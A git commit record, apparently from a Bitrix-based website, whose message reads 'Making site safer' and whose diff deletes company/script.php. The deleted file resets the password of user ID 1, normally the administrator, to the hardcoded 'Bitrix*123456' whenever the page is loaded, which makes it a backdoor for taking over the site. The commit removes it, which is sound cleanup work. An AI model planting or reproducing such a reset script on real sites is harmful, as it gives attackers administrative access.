319b1715bf55468b58e1015d10015387a6fdd14d
husein <programmerfromrussia@gmail.com>
2024-11-07 23:24:13 +0300

    Making site safer

--- company/script.php
+++
@@ -1,6 +0,0 @@
-<?
-require($_SERVER['DOCUMENT_ROOT']."/bitrix/header.php");
-echo $USER->Update(1,array("PASSWORD"=>'Bitrix*123456'));
-echo $USER->LAST_ERROR;
-require($_SERVER['DOCUMENT_ROOT']."/bitrix/footer.php");
-?>
